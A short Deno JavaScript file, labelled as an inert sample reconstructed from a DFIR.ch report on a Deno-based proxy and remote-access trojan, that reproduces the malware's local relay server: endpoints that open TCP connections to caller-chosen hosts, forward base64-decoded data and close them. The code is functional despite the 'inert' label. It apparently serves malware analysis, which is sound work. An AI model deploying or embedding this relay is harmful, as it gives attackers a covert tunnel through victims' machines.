// Inert static sample reconstructed from DFIR.ch "Anatomy of a Deno-Based Proxy & RAT".
// SHA-256 in report for original webui.js: 2ed6fdfa5f9120306167ba5d8d48a62dbe5fd0d05e87c33c9784f08698f8a66b
const sockets = new Map();

Deno.serve({ hostname: "127.0.0.1", port: 10022 }, async (req) => {
  const url = new URL(req.url);
  const body = await req.json();

  if (url.pathname === "/connect") {
    const socket = await Deno.connect({ hostname: body.ip, port: body.port });
    const socketId = crypto.randomUUID();
    sockets.set(socketId, socket);
    return Response.json({ socketId });
  }

  if (url.pathname === "/send") {
    const socket = sockets.get(body.socketId);
    const payload = Uint8Array.from(atob(body.data), (c) => c.charCodeAt(0));
    await socket.write(payload);
    return Response.json({ ok: true });
  }

  if (url.pathname === "/closesocket") {
    sockets.get(body.socketId)?.close();
    sockets.delete(body.socketId);
    return Response.json({ ok: true });
  }

  return new Response("not found", { status: 404 });
});
